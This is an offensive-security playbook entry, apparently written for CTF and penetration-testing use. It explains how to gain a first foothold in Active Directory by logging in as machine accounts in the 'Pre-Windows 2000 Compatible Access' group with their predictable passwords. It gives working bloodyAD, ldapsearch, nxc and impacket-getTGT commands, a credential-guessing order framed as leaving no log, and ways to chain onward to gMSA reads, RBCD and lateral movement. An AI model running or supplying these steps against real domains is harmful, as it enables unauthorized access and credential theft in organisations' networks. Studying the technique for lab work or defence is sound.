# Pre-Windows 2000 Compatible Access — Initial Foothold

## When this applies

- You have unauthenticated network access to a DC.
- The domain has machine accounts in the legacy "Pre-Windows 2000 Compatible Access" group.
- Goal: authenticate as a machine account using its predictable default password — no prior creds required.

## Technique

Machine accounts in the "Pre-Windows 2000 Compatible Access" group have predictable passwords: lowercase machine name without the trailing `$`. Example: machine `WEB01$` → password `web01`. This is a one-step initial foothold on legacy-configured AD environments.

## Steps

```bash
# Machine accounts in the "Pre-Windows 2000 Compatible Access" group have predictable passwords
# Password = lowercase machine name without the trailing $
# Example: machine "WEB01$" → password "web01"

# Step 1: Enumerate members of the Pre-2K group
bloodyAD -d domain -u '' -p '' --host DC_IP get group 'Pre-Windows 2000 Compatible Access'
# Or: ldapsearch -H ldap://DC_IP -x -b "DC=domain,DC=com" '(&(objectClass=computer)(memberOf=CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=domain,DC=com))' sAMAccountName
# Or with creds: nxc ldap DC_IP -u user -p pass -M groupmembers -o GROUP="Pre-Windows 2000 Compatible Access"

# Step 2: Authenticate with machine account + predictable password
# For machine YOURPC$ → password "yourpc"
impacket-getTGT 'domain/YOURPC$:yourpc' -dc-ip DC_IP
# If machine has SPN: Kerberoast from it, read gMSA passwords, check RBCD paths
# If password expired: try nxc smb DC_IP -u 'YOURPC$' -p 'yourpc' --sam (may still work for auth)
# Chain: Pre-2K machine cred → gMSA read permission → service account → lateral movement
```

## Verifying success

- `impacket-getTGT 'domain/YOURPC$:yourpc'` returns a `.ccache` for the machine account.
- `nxc ldap DC -u 'YOURPC$' -p 'yourpc'` enumerates LDAP successfully.

## Common pitfalls

- Machine name is case-sensitive only in the password (lowercase). The `sAMAccountName` value usually appears in mixed case in LDAP — convert to lowercase for the password.
- Passwords may have been changed by an admin — try a few different members; one expired/locked account doesn't kill the technique.
- Once authenticated, look for: gMSA read membership, RBCD-writable computers, Kerberoastable SPNs on the machine itself.
- **Even without the Pre-Win2K group, machine accounts created with `password = machine name` (no `$`) are common in CTF / lab AD** — try the predictable password against `<NAME>$:<name>` via Kerberos pre-auth even when the domain doesn't show `Pre-Windows 2000 Compatible Access` membership. SMB returns `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` for a valid machine acct using NTLM (workstations can't NTLM-logon interactively), but `getTGT.py 'domain/RED$:red'` succeeds because Kerberos pre-auth doesn't enforce that policy.
- **Dual brute-force order**: (1) enumerate users via Kerbrute / GetNPUsers (no auth, no log), (2) test `username:username` and `username$:username` for every discovered name. This often hits a forgotten machine setup before any LDAP enum is possible.
- **Hint patterns in CTF/HTB challenges**: ToDo notes / README files mentioning "pre-created computer account", "older than me", "ancient", "legacy", "Pre-Win2K", or naming a machine account directly are strong signals to try the lowercase-name password against `<NAME>$`. Always rid-brute SMB after low-priv access to discover machine accounts not in regular user enumeration (e.g., `BANKING$`, `WEB01$`, `MS01$`). Example: HTB Retro — `BANKING$:banking` → ESC1 chain.

## Tools

- bloodyAD
- impacket `getTGT.py`
- ldapsearch
- nxc (netexec)
